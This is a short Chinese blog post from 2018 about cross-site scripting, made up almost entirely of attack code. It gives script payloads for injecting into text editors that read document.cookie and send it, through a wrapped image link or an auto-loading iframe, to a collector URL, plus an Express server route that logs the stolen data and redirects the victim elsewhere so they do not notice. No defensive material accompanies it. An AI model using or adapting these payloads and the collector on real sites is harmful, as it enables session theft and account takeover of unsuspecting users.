---
title: 理解学习跨站脚本攻击原理
date: '2018-07-12T17:18:40+00:00'
status: publish
permalink: /2018/07/12/%e7%90%86%e8%a7%a3%e5%ad%a6%e4%b9%a0%e8%b7%a8%e7%ab%99%e8%84%9a%e6%9c%ac%e6%94%bb%e5%87%bb%e5%8e%9f%e7%90%86
author: 毛巳煜
excerpt: ''
type: post
id: 2218
category:
    - 网络基础
tag: []
post_format: []
hestia_layout_select:
    - default
---
### XSS

#### 针对 markdown textarea 等 文本编辑器

```javascript
<script>
(function() { alert(document.cookie)})()
</script>

```

#### 针对 图片src 或者事有超链接的做法

```javascript
// 点击打开的图片, 会触发脚本
<script>
var img = document.createElement('img');
img.src = 'http://www.private-blog.com/wp-content/uploads/2017/11/fa37d627538d082e52b4351f1e6bb7a6.jpg';
var a = document.createElement('a');
a.href =  'http://localhost:8888/db/insert?data=' + document.cookie;
a.append(img);
document.body.append(a);
</script>

```

#### 针对 iframe 的src属性 进行获取数据

```javascript
<script>
var iframe = document.createElement('iframe');
iframe.src = 'http://localhost:8888/db/insert?data=' + document.cookie;
document.body.append(iframe);
</script>

```

#### 对应的服务器端写法

```javascript
const express = require('express');
const router = express.Router();
/**
 * 获取请求的数据
 * x-www-form-urlencoded
 */
router.get('/db/insert/', (req, res) => {
    // 获取传入的数据
    let params = req.query;
    console.log(params);
     // 将这次的请求重定向 到 正常的请求URL, 避免使用者察觉
    res.redirect('http://www.baidu.com');
});
module.exports = router;

```

###### 学习中持续分享..........